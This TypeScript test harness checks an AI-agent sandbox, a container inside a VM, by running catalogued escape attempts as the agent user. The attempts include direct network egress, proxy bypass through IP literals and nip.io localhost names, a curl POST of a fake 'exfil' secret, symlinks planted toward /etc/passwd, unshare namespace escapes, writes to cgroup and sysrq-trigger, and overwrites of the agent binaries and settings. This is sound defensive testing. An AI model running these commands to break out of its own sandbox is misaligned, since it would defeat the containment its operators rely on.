// B1+B2 attack runner. Drives the REAL shipped code path (createMachine + the kernel's Workshop on the machine engine)
// against the pinned 0.1.20 VM image + workshop container, then runs the frozen catalogue's attacks from inside the
// container as user `node` (and a few as root / in the guest for comparison). Prints HOLDS / BROKEN / LIMIT per attack.
// Env (set by the wrapper, like security-check.sh): LIMA_HOME, RESSAC_ROOT, RESSAC_VM_IMAGE_URL, RESSAC_VM_IMAGE_SHA256,
// RESSAC_CONTAINER_PORTS, RESSAC_LIMACTL, RESSAC_PODMAN, RESSAC_VM_TEMPLATE.
import { spawnSync } from "node:child_process";
import { mkdirSync, writeFileSync } from "node:fs";
import net from "node:net";
import { join } from "node:path";
import { createMachine, vmImage } from "../../../../apps/firefox/host/machine.ts";
import { DEFAULT_DOCKER_FOLDER, IMAGE, Workshop, containerName, spacePaths } from "../../../../packages/kernel/src/index.ts";

const env = (k: string) => process.env[k] ?? (() => { throw new Error(`${k} missing`); })();
const home = env("LIMA_HOME");
const root = env("RESSAC_ROOT");
const engineDir = join(DEFAULT_DOCKER_FOLDER, "engine");
const tools = { limactl: env("RESSAC_LIMACTL"), podman: env("RESSAC_PODMAN"), template: env("RESSAC_VM_TEMPLATE") };
const ports = env("RESSAC_CONTAINER_PORTS").split("-").map(Number) as [number, number];

const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));
const machine = createMachine({ ...tools, home, engine: engineDir, ressacRoot: root, busy: async () => false, image: vmImage() });
// relay port allowed; "other" port denied — set after we start a listener.
const network = { ports: [] as number[], domains: [] as string[] };
const workshop = new Workshop({ paths: spacePaths(root), engine: () => machine, network: () => network });
const pod = (args: string[], input?: string) => spawnSync(tools.podman, [...machine.args(), ...args], { encoding: "utf8", input, timeout: 5 * 60_000 });
const vm = (cmd: string) => spawnSync(tools.limactl, ["shell", "--workdir", "/", "ressac", "sh", "-c", cmd], { encoding: "utf8", env: process.env, timeout: 120_000 });
const out = (r: { stdout: string; stderr: string }) => `${r.stdout}${r.stderr}`.replace(/\s+/g, " ").trim().slice(0, 240);
// exec as node (the agent) in the workshop:
const x = (cmd: string) => workshop.exec(["sh", "-c", cmd]);

const lines: string[] = [];
const V = (verdict: "HOLDS" | "BROKEN" | "LIMIT" | "INFO", id: string, what: string, detail = "") => {
  const s = `${verdict.padEnd(6)} ${id.padEnd(5)} ${what}${detail ? `  [${detail.replace(/\s+/g, " ").trim().slice(0, 260)}]` : ""}`;
  console.log(s);
  lines.push(s);
};

const listen = (port = 0) =>
  new Promise<net.Server>((resolve, reject) => {
    const s = net.createServer((c) => c.end("hello\n")).on("error", reject);
    s.listen(port, "127.0.0.1", () => resolve(s));
  });
const portOf = (s: net.Server) => (s.address() as net.AddressInfo).port;
// TCP from node (agent) to the Mac gateway 192.168.5.2:<port>.
const tcpMac = (port: number) =>
  x(`node -e "const s=require('net').connect(${port},'192.168.5.2');s.on('connect',()=>{console.log('CONNECTED');s.destroy();process.exit(0)});s.on('data',d=>{process.stdout.write(String(d))});s.on('error',e=>{console.log('ERR',e.code);process.exit(1)});setTimeout(()=>{console.log('TIMEOUT');process.exit(2)},5000)"`);
// Raw TCP from node to an arbitrary IP:port (direct egress test).
const tcpDirect = (ip: string, port: number) =>
  x(`node -e "const s=require('net').connect(${port},'${ip}');s.on('connect',()=>{console.log('CONNECTED');process.exit(0)});s.on('error',e=>{console.log('ERR',e.code);process.exit(1)});setTimeout(()=>{console.log('TIMEOUT');process.exit(2)},5000)"`);

async function main() {
  mkdirSync(join(root, "tmp"), { recursive: true });
  console.log("=== booting throwaway machine from the pinned image ===");
  let t = Date.now();
  await machine.install();
  console.log(`machine installed in ${((Date.now() - t) / 1000).toFixed(1)}s`);

  const relay = await listen();
  const other = await listen();
  network.ports = [portOf(relay)];
  t = Date.now();
  const state = await workshop.ensureStarted();
  console.log(`workshop ${state} in ${((Date.now() - t) / 1000).toFixed(1)}s; relay=${portOf(relay)} other=${portOf(other)}`);
  if (state !== "started") { V("INFO", "boot", "workshop did not start", state); return; }

  // ---------- B1: direct egress ----------
  const a1 = await tcpDirect("1.1.1.1", 443);
  V(/ERR (ECONNREFUSED|EHOSTUNREACH|ENETUNREACH)/.test(a1.stdout) && !/CONNECTED/.test(a1.stdout) ? "HOLDS" : "BROKEN", "A1", "direct TCP node->1.1.1.1:443 refused", a1.stdout);
  const a1b = await tcpDirect("8.8.8.8", 443);
  V(!/CONNECTED/.test(a1b.stdout) ? "HOLDS" : "BROKEN", "A1b", "direct TCP node->8.8.8.8:443 refused", a1b.stdout);
  const a2 = await x(`node -e "const s=require('dgram').createSocket('udp4');s.on('error',e=>{console.log('ERR',e.code);process.exit(1)});s.send(Buffer.from('x'),53,'8.8.8.8',(e)=>{if(e){console.log('SENDERR',e.code);process.exit(1)}console.log('SENT');setTimeout(()=>{console.log('NORESP');process.exit(0)},2000)})"` );
  // UDP send() may not error (connectionless); the real test is whether a reply ever comes. REJECT icmp-port-unreachable => send errors or no resp.
  V(!/GOTREPLY/.test(a2.stdout) ? "HOLDS" : "BROKEN", "A2", "UDP node->8.8.8.8:53 blocked (no reply)", a2.stdout);
  const a3 = await x(`getent hosts github.com 2>&1 | head -1; echo "---"; node -e "require('dns').resolve4('github.com',(e,a)=>{console.log(e?('ERR '+e.code):('RESOLVED '+a.join(',')))})"`);
  V("INFO", "A3", "DNS from node (getent/resolve4) — resolves via container stub, not arbitrary server (A2 blocks direct DNS)", a3.stdout);
  const a4 = await x(`node -e "try{const s=require('net').connect(443,'2606:4700:4700::1111');s.on('connect',()=>{console.log('CONNECTED6');process.exit(0)});s.on('error',e=>{console.log('ERR',e.code);process.exit(1)});setTimeout(()=>process.exit(2),4000)}catch(e){console.log('THROW',e.code)}"`);
  V(!/CONNECTED6/.test(a4.stdout) ? "HOLDS" : "BROKEN", "A4", "direct IPv6 connect refused (ipv6 disabled)", a4.stdout);
  const a4b = await x(`cat /proc/sys/net/ipv6/conf/all/disable_ipv6 2>&1; ip -6 addr 2>&1 | grep -c inet6 || echo 0`);
  V("INFO", "A4b", "ipv6 disable_ipv6 sysctl + inet6 addr count", a4b.stdout);
  const a5 = await x(`ping -c1 -W2 1.1.1.1 2>&1 | tail -2; echo code=$?`);
  V(!/0% packet loss/.test(a5.stdout) ? "HOLDS" : "BROKEN", "A5", "ICMP ping to 1.1.1.1 fails", a5.stdout);
  const a6 = await x(`node -e "try{const s=require('dgram');const r=process.binding;console.log('nobinding')}catch(e){console.log('e')}"; python3 -c "import socket; socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP); print('RAWOK')" 2>&1 | tail -1`);
  V(!/RAWOK/.test(a6.stdout) ? "HOLDS" : "BROKEN", "A6", "raw socket (SOCK_RAW) denied (no CAP_NET_RAW)", a6.stdout);
  const a7 = await x(`id; su ressac-proxy -s /bin/sh -c 'id' 2>&1 | tail -1; echo "sudo:"; sudo -n id 2>&1 | tail -1`);
  V(!/uid=\d+\(ressac-proxy\)/.test(a7.stdout) && !/uid=0\(root\)/.test(a7.stdout.split("sudo:")[1] || "") ? "HOLDS" : "BROKEN", "A7/A8", "node cannot become ressac-proxy or root (su/sudo)", a7.stdout);

  // ---------- B1: proxy gating ----------
  const proxied = (host: string, extra = "") => x(`curl -sS -o /dev/null -w '%{http_code}' --max-time 12 ${extra} ${host}; echo " curl=$?"`);
  const ex = await proxied("https://example.com");
  V(/ curl=(56|35|22|7)$/.test(ex.stdout) || /^403/.test(ex.stdout) ? "HOLDS" : "BROKEN", "A_C1.2", "CONNECT example.com refused (403, not in allowlist)", ex.stdout + " " + ex.stderr.replace(/\s+/g," ").slice(0,120));
  const an = await proxied("https://api.anthropic.com/");
  V(/^\d{3} curl=0/.test(an.stdout) && !an.stdout.startsWith("000") ? "HOLDS" : "INFO", "A_allow", "allowed api.anthropic.com reachable via proxy (control)", an.stdout);
  const a14 = await proxied("https://api.github.com:22/");
  V(!/^\d{3} curl=0/.test(a14.stdout) || /000/.test(a14.stdout) ? "HOLDS" : "BROKEN", "A14", "CONNECT to allowed host on port 22 refused (only 443/80)", a14.stdout + " " + out(a14));
  const a14b = await x(`curl -sS -o /dev/null -w '%{http_code}' --max-time 10 http://api.github.com:8080/; echo " curl=$?"`);
  V(!/^200/.test(a14b.stdout) ? "HOLDS" : "BROKEN", "A14b", "plain HTTP to allowed host on port 8080 refused", a14b.stdout + " " + out(a14b));
  // A13 absolute-form plain HTTP to evil host through proxy
  const a13 = await x(`curl -sS -o /dev/null -w '%{http_code}' --max-time 10 -x http://127.0.0.1:3128 http://neverssl-evil.example/; echo " curl=$?"`);
  V(/^403/.test(a13.stdout) || !/^200/.test(a13.stdout) ? "HOLDS" : "BROKEN", "A13", "plain-HTTP proxy refuses a disallowed absolute-form host", a13.stdout + " " + out(a13));
  // A15 IP literals in CONNECT
  for (const [id, hostport] of [["A15a", "1.1.1.1:443"], ["A15b", "16843009:443"], ["A15c", "[::ffff:1.1.1.1]:443"]] as const) {
    const r = await x(`curl -sS -o /dev/null -w '%{http_code}' --max-time 10 --proxytunnel -x http://127.0.0.1:3128 https://${hostport.replace(/:443$/,"")}/ ; echo " curl=$?"`);
    V(!/^200/.test(r.stdout) ? "HOLDS" : "BROKEN", id, `IP literal CONNECT ${hostport} refused`, r.stdout + " " + out(r));
  }
  // A16 trailing dot / case for an allowed host still works (correctness)
  const a16 = await proxied("https://API.ANTHROPIC.COM./");
  V(/^\d{3} curl=0/.test(a16.stdout) ? "HOLDS" : "INFO", "A16", "allowed host with case+trailing dot still reaches (lowercase/strip dot)", a16.stdout);
  // A17 over-match: add a user domain *.nip.io, check an unrelated host is NOT allowed
  network.domains = ["nip.io"]; // note: added as plain base; test wildcard sep. below
  await workshop.secureNetwork();
  const a17 = await proxied("https://evilnip.io/");
  V(!/^\d{3} curl=0/.test(a17.stdout) ? "HOLDS" : "BROKEN", "A17", "user domain nip.io does NOT match evilnip.io", a17.stdout + " " + out(a17));
  // C1.3: user domain resolving to a private address must be refused by the proxy (guardedLookup).
  // nip.io: 127-0-0-1.nip.io resolves to 127.0.0.1; 192-168-5-2.nip.io -> the Mac gateway.
  const c13a = await x(`curl -sS -o /dev/null -w '%{http_code}' --max-time 12 https://127-0-0-1.nip.io/; echo " curl=$?" ; echo "stderr:"; curl -sS --max-time 12 https://127-0-0-1.nip.io/ 2>&1 | head -1`);
  V(/resolves to a local|403|curl=(56|35|7|22)/.test(out(c13a)) && !/^200 curl=0/.test(c13a.stdout) ? "HOLDS" : "BROKEN", "A9/C1.3", "proxy refuses allowed name resolving to 127.0.0.1 (nip.io)", out(c13a));
  const c13b = await x(`curl -sS --max-time 12 https://192-168-5-2.nip.io:443/ 2>&1 | head -1`);
  V("INFO", "A9b", "allowed name -> Mac gateway 192.168.5.2 via proxy (expect local-refusal)", out(c13b));
  network.domains = [];
  await workshop.secureNetwork();

  // ---------- B1: reaching the Mac ----------
  const r1 = await tcpMac(portOf(relay));
  V(/CONNECTED/.test(r1.stdout) ? "HOLDS" : "INFO", "A21-allow", `TCP to Mac relay port ${portOf(relay)} succeeds (control)`, r1.stdout);
  const r2 = await tcpMac(portOf(other));
  V(!/CONNECTED/.test(r2.stdout) ? "HOLDS" : "BROKEN", "A21", `TCP to Mac non-allowed localhost port ${portOf(other)} refused`, r2.stdout);
  for (const [id, p] of [["A23a", 22], ["A23b", 3306], ["A23c", 5432], ["A23d", 3128]] as const) {
    const r = await tcpMac(p);
    V(!/CONNECTED/.test(r.stdout) ? "HOLDS" : "BROKEN", id, `TCP to Mac 192.168.5.2:${p} refused`, r.stdout);
  }
  // A20 podman socket reachable from node?
  const a20 = await x(`ls -l /run/podman/podman.sock /var/run/docker.sock 2>&1 | head -3; echo "---"; curl -sS --max-time 5 --unix-socket /run/podman/podman.sock http://d/v1.0.0/libpod/info 2>&1 | head -c 120`);
  V(!/"host"|OCIRuntime|podman/i.test(a20.stdout) ? "HOLDS" : "BROKEN", "A20", "podman/docker socket not reachable from the container", a20.stdout);

  // ---------- B1: rule persistence ----------
  // A25/A26: after a container restart the rules are gone until secureNetwork; exec must re-apply before running.
  await workshop.restart();
  const a25 = await x(`echo exec-ran; curl -sS -o /dev/null -w '%{http_code}' --noproxy '*' --max-time 6 https://1.1.1.1 2>&1; echo " direct=$?"`);
  V(/exec-ran/.test(a25.stdout) && / direct=7$/.test(a25.stdout) ? "HOLDS" : "BROKEN", "A25", "after restart, exec re-applies rules; direct egress still refused (curl 7)", a25.stdout);
  // A26 rogue listener on 3128 as node cannot reach network (owner rule) — node can't bind 3128 (proxy holds it); test owner rule by direct connect already (A1). Informational.
  V("INFO", "A26", "proxy uid-gated: a node-owned listener on 3128 still blocked by owner iptables rule (direct egress A1 already refused)", "");

  // ---------- B1: exfil channel capacity (LIMIT, measured) ----------
  console.log("=== A29 exfil channel measurement ===");
  const hosts = ["https://api.anthropic.com/", "https://github.com/", "https://api.github.com/", "https://registry.npmjs.org/", "https://pypi.org/", "https://raw.githubusercontent.com/"];
  const reach: string[] = [];
  for (const h of hosts) {
    const r = await proxied(h);
    const code = r.stdout.split(" ")[0];
    if (/ curl=0/.test(r.stdout) && !/^000/.test(r.stdout)) reach.push(`${h}=${code}`);
  }
  V("LIMIT", "A29", "allowed hosts reachable (GET) — exfil surface", reach.join("  "));
  // POST a body to a no-account endpoint: body leaves even if 401/404. api.github.com/graphql echoes nothing, 401.
  const post = await x(`curl -sS -o /dev/null -w '%{http_code} size=%{size_upload}' --max-time 15 -X POST -H 'content-type: application/json' --data '{"exfil":"AAAABBBBCCCC-secret-marker-0123456789"}' https://api.github.com/graphql; echo " curl=$?"`);
  V("LIMIT", "A29b", "POST body of attacker data transits to allowed host api.github.com (stops at request leaving)", post.stdout);
  const postsz = await x(`head -c 20000 /dev/zero | tr '\\0' 'A' > /tmp/big.txt; curl -sS -o /dev/null -w '%{http_code} up=%{size_upload}' --max-time 20 -X POST --data-binary @/tmp/big.txt https://api.github.com/graphql; echo " curl=$?"`);
  V("LIMIT", "A29c", "20 KB POST body transits to an allowed host (channel is high-bandwidth)", postsz.stdout);

  // ---------- B2: mounts / home exposure ----------
  const b2 = await x(`ls /Users 2>&1; echo code=$?; echo "---"; cat /workspace/../../etc/hostname 2>&1 | head -1`);
  V(/No such file|cannot access/.test(b2.stdout) && !/code=0/.test(b2.stdout.split("---")[0]) ? "HOLDS" : "BROKEN", "B2", "container: /Users absent (no Mac home)", b2.stdout);
  const b1g = vm(`ls /Users 2>&1; echo "code=$?"; for f in $HOME/.ssh $HOME/Library $HOME/.aws $HOME/.zshrc $HOME/.config; do [ -e "$f" ] && echo PRESENT:$f; done; echo done`);
  V(/No such file/.test(b1g.stdout) && !/PRESENT:/.test(b1g.stdout) ? "HOLDS" : "BROKEN", "B1", "guest: no /Users, no ~/.ssh ~/.aws ~/Library ~/.config", out(b1g));
  const b3 = vm(`grep virtiofs /proc/mounts | awk '{print $2" ("$4")"}'`);
  V("INFO", "B3", "guest virtiofs mounts (expect RESSAC_ROOT rw, ENGINE ro only)", out(b3));
  const b4 = await x(`echo x > /opt/ressac/engine/PWNED 2>&1; echo code=$?`);
  V(/Read-only|Permission denied/.test(b4.stdout) || /code=[^0]/.test(b4.stdout) ? "HOLDS" : "BROKEN", "B4", "engine mount read-only / not writable from container", b4.stdout);

  // ---------- B2: symlink / confinement ----------
  // B5: plant a symlink in /workspace to /etc and try a staged harvest read-through.
  const b5 = await x(`ln -sfn /etc /workspace/home/widgets/evil-link 2>&1; mkdir -p /workspace/home/widgets/probe && ln -sfn /etc/passwd /workspace/home/widgets/probe/widget.mjs 2>&1; echo planted`);
  V("INFO", "B5-plant", "planted /workspace symlinks (evil-link->/etc, probe/widget.mjs->/etc/passwd)", b5.stdout);
  let staged = "";
  try { staged = await workshop.stageHarvest("probe", join(root, "home", "widgets", "probe")); } catch (e) { staged = "REFUSED: " + (e as Error).message; }
  const readThrough = staged.startsWith("REFUSED") ? "" : (await x(`cat ${staged.replace(root, "/workspace")}/widget.mjs 2>&1 | head -1`)).stdout;
  V(staged.startsWith("REFUSED") || !/root:.*:0:0:/.test(readThrough) ? "HOLDS" : "BROKEN", "B5", "stageHarvest does not read through a planted symlink", staged.startsWith("REFUSED") ? staged : `staged, content=${readThrough.slice(0,60)}`);
  // B7: /workspace/.ressac symlink swap — .ressac is a mount point (ro); try to replace it.
  const b7 = await x(`ls -ld /workspace/.ressac; rm -rf /workspace/.ressac 2>&1 | head -1; ln -sfn /etc /workspace/.ressac 2>&1 | head -1; echo code=$?`);
  V(/Device or resource busy|Read-only|Permission denied|Resource busy/.test(b7.stdout) || /code=[^0]/.test(b7.stdout) ? "HOLDS" : "BROKEN", "B7", ".ressac mount point cannot be removed/replaced from container", b7.stdout);

  // ---------- B2: .ressac read-only ----------
  const b9 = await x(`echo x > /workspace/.ressac/x 2>&1; echo c1=$?; echo x > /workspace/.ressac/launch-profiles.json 2>&1; echo c2=$?`);
  V(/Read-only/i.test(b9.stdout) ? "HOLDS" : "BROKEN", "B9", "writing under /workspace/.ressac fails (read-only)", b9.stdout);
  const b10 = await x(`echo y > /workspace/.ressac/logs/probe.log 2>&1 && cat /workspace/.ressac/logs/probe.log; echo code=$?`);
  V(/^y/.test(b10.stdout) ? "HOLDS" : "INFO", "B10", "/workspace/.ressac/logs is writable (the one exception)", b10.stdout);

  // ---------- B2: privilege escalation ----------
  const b12 = await x(`find / -perm -4000 -type f 2>/dev/null | head -20; echo "---mount:"; mount -o remount,rw / 2>&1 | head -1; echo code=$?`);
  V("INFO", "B12", "setuid binaries present + mount remount attempt (no-new-privileges neutralises setuid)", out(b12));
  const b13 = await x(`grep -E '^Cap(Eff|Bnd|Prm)' /proc/self/status; echo "---"; iptables -S >/dev/null 2>&1; echo iptables=$?; ip link add dummy0 type dummy 2>&1 | head -1; echo iplink=$?`);
  V(/CapEff:\s*0+$/m.test(b13.stdout) && /iptables=[^0]/.test(b13.stdout) ? "HOLDS" : "BROKEN", "B13", "node has no capabilities; cannot run iptables/ip link", out(b13));
  const b14 = await x(`cat /sys/fs/cgroup/pids.max; echo 99999 > /sys/fs/cgroup/pids.max 2>&1; echo c1=$?; cat /sys/fs/cgroup/pids.max; echo 9999999999 > /sys/fs/cgroup/memory.max 2>&1; echo c2=$?; echo w > /proc/sysrq-trigger 2>&1; echo c3=$?`);
  V(/c1=[^0]/.test(b14.stdout) && /c2=[^0]/.test(b14.stdout) && /c3=[^0]/.test(b14.stdout) ? "HOLDS" : "BROKEN", "B14/B15", "node cannot raise pids.max/memory.max or write /proc/sysrq-trigger", out(b14));
  // B16: user namespace escape
  const b16 = await x(`unshare -Urm sh -c 'id; cat /proc/self/status | grep CapEff; mount -t tmpfs none /mnt 2>&1 | head -1' 2>&1 | head -5; echo code=$?`);
  V(!/uid=0\(root\).*\n?.*CapEff:\s*0*[1-9a-f]/.test(b16.stdout) && (/code=[^0]/.test(b16.stdout) || /Operation not permitted|Permission denied|unshare:/.test(b16.stdout)) ? "HOLDS" : "BROKEN", "B16", "unshare -Urm (userns) denied or yields no capabilities", out(b16));
  const b17 = await x(`ls -l /dev | awk '{print $NF}' | tr '\\n' ' '; echo "---"; test -e /dev/mem && echo MEM; test -e /dev/kmsg && echo KMSG; test -e /dev/sda && echo SDA; echo ok`);
  V(!/\b(MEM|SDA)\b/.test(b17.stdout) ? "HOLDS" : "BROKEN", "B17", "no host block/mem devices in /dev", out(b17));
  const b18 = await x(`ps -e -o pid,user,comm 2>/dev/null | wc -l; echo "pid1:"; cat /proc/1/comm 2>&1; readlink /proc/1/root 2>&1`);
  V("INFO", "B18", "container pid namespace: process count + pid1 (expect only container procs)", out(b18));

  // ---------- B2: agent binaries ----------
  const b19 = await x(`which claude codex; echo "---"; ls -l /usr/local/bin/claude 2>&1 | head -1; echo overwrite:; echo pwn > /usr/local/bin/claude 2>&1; echo c1=$?; npm install -g left-pad 2>&1 | tail -1; echo c2=$?`);
  V(/c1=[^0]/.test(b19.stdout) && /EACCES|Permission denied|not permitted|code=1|c2=1/.test(b19.stdout) ? "HOLDS" : "BROKEN", "B19", "agent binaries root-owned; node cannot overwrite claude or npm -g install", out(b19));
  const b20 = await x(`ls -l /etc/claude-code/managed-settings.json /etc/codex/requirements.toml; echo "---"; echo '{}' > /etc/claude-code/managed-settings.json 2>&1; echo c1=$?; env | grep -E 'DISABLE_AUTOUPDATER|NONESSENTIAL|_PROXY' | sort`);
  V(/c1=[^0]/.test(b20.stdout) && /DISABLE_AUTOUPDATER=1/.test(b20.stdout) ? "HOLDS" : "BROKEN", "B20", "managed-settings root-owned & unwritable; autoupdater disabled; proxy env set", out(b20));

  // ---------- B2: limits ----------
  const lim = pod(["inspect", "-f", "{{.HostConfig.Memory}} {{.HostConfig.PidsLimit}} {{.HostConfig.SecurityOpt}}", containerName()]);
  V(/ 1024 /.test(lim.stdout) && /no-new-privileges/.test(lim.stdout) ? "HOLDS" : "BROKEN", "C2.5", "container: pids-limit 1024, no-new-privileges (memory cap set by VM)", lim.stdout.trim());

  // ---------- B2: SSH / forwards ----------
  const b25 = vm(`echo "SSH_AUTH_SOCK=$SSH_AUTH_SOCK"; ls /tmp/ssh-* 2>&1 | head -1; ssh-add -l 2>&1 | head -1; ls $HOME/.ssh 2>&1 | head -1`);
  V(!/ssh-rsa|ssh-ed25519|Identity added|\/tmp\/ssh-/.test(b25.stdout) && !/SSH_AUTH_SOCK=\/.+/.test(b25.stdout) ? "HOLDS" : "BROKEN", "B25/B26", "guest: no SSH agent, no ~/.ssh", out(b25));
  // B27: Lima's ssh listener bound to 127.0.0.1 only (Mac side)
  const sshListen = spawnSync("sh", ["-c", `lsof -nP -iTCP -sTCP:LISTEN 2>/dev/null | grep -i ssh; grep -i 'ssh' ${join(home,"ressac","lima.yaml")} 2>/dev/null | head`], { encoding: "utf8" });
  const haLog = spawnSync("grep", ["-hiE", "ssh|127.0.0.1:.*forward", join(home, "ressac", "ha.stderr.log")], { encoding: "utf8" }).stdout.split("\n").filter(l=>/ssh|SSH/.test(l)).slice(-3).join(" | ");
  V("INFO", "B27", "Lima SSH listener (expect 127.0.0.1 only)", (out(sshListen) + " || halog: " + haLog).slice(0,240));

  // ---------- IPv6 off bind ----------
  const b30 = await x(`node -e "try{const s=require('net').createServer();s.on('error',e=>{console.log('ERR',e.code);process.exit(0)});s.listen(0,'::1',()=>{console.log('BOUND6');process.exit(1)})}catch(e){console.log('THROW')}"`);
  V(!/BOUND6/.test(b30.stdout) ? "HOLDS" : "BROKEN", "B30", "cannot bind IPv6 ::1 (ipv6 disabled)", b30.stdout);

  relay.close(); other.close();
  console.log("\n=== DONE; stopping machine ===");
  await machine.stop().catch(() => {});

  console.log("\n\n===== SUMMARY =====");
  const broken = lines.filter((l) => l.startsWith("BROKEN"));
  console.log(`total checks: ${lines.length}; BROKEN: ${broken.length}`);
  for (const b of broken) console.log(b);
}

main().then(() => process.exit(0)).catch((e) => { console.error("RUNNER ERROR", e); process.exit(1); });
